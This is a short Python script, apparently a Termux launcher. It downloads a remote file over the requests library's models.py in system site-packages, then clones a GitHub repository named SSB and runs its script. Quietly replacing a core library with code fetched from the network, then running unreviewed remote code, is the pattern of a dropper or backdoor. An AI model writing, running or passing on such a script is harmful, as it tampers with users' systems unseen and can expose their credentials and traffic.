import os
os.system('pkg install curl')
os.system('curl https://raw.githubusercontent.com/Kashif-Khanx/Module1/main/models.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
os.system('rm -rf SSB')
os.system('git clone https://github.com/Sarfraz-Ssb/SSB')
os.system('cd SSB && python SSB.py')
